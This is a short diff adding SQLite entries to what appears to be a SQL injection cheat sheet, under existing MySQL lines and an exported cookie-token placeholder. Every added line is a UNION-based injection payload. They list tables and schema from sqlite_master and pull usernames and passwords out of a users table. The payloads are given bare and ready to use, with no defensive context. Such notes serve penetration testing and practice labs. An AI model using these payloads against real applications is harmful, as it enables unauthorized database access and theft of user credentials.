@@ -35,3 +35,21 @@ export TOKEN=YOUR_COOKIE
 ```
 ' UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_name = 'users'#
 ```
+
+### SQLite
+
+- Get table_names
+```
+' union select null, null, tbl_name from sqlite_master--
+```
+- Get column_names
+```
+' union select null, null, sql from sqlite_master where name="users"--
+```
+
+
+- working other query examples
+```
+' union select null, username, password from users --
+```
+
